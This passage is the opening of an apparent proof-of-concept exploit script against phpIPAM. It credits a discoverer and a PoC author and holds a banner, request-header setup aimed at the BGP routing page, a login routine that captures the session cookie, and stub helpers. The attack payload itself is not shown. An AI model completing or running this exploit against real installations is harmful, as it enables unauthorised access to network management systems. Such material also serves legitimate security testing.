import sys
import urllib3

urllib3.disable_warnings()

def banner():
    print("""  ___  _  _  ____     ___   ___  ___   ___      ___   ___   ___    __    _  
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ \ ___(__ \ (__ ) / _ \  /. |  / ) 
( (__  \  /  )__)(___)/ _/( (_) )/ _/  / _/(___)/ _/  (_ \( (_) )(_  _)/ _ \\
 \___)  \/  (____)   (____)\___/(____)(____)   (____)(___/ \___/   (_) \___/
""")
    print("                                     Vulnerability discovered by Oscar Uribe")
    print("                                                 PoC author: @javicarabantes")


def generate_headers(csrftoken, phpipam_session):
    return {
        "Host": "localhost:8888",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "214",
        "Origin": "http://localhost:8888",
        "Connection": "close",
        "Referer": "http://localhost:8888/index.php?page=tools&section=routing&subnetId=bgp&sPage=1",
        "Cookie": f"csrftoken={csrftoken}; dojo-sidebar=max; phpipam={phpipam_session}; table-page-size=50",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }

def get_bgp_id():
    # Does not seem to be a requirement in phpipam 1.4.3 and 1.4.4
    return 1

def login(session, login_url, ipamusername, ipampassword, csrftoken):

    headers = generate_headers(None, None)
    # We don't need the cookie for login
    headers.pop("Cookie")

    payload = {
        "ipamusername": ipamusername,
        "ipampassword": ipampassword
    }

    response = session.post(login_url, data=payload, headers=headers, verify=False)

    if response.status_code == 200:
        if "Invalid username" in response.text:
            print("Bad credentials")
            sys.exit(1)

        if len(session.cookies.get_dict()) > 0 and "phpipam" in session.cookies.get_dict():
            return session.cookies.get_dict()['phpipam']
        else:
            print("no phpipam session returned")
            sys.exit(1)
    else:
        print(f"Status code was {response.status_code}. Check the URL")
        sys.exit(1)

def fetch_csrf_token():
    # Does not seem to be a requirement in phpipam 1.4.3 and 1.4.4
    return None

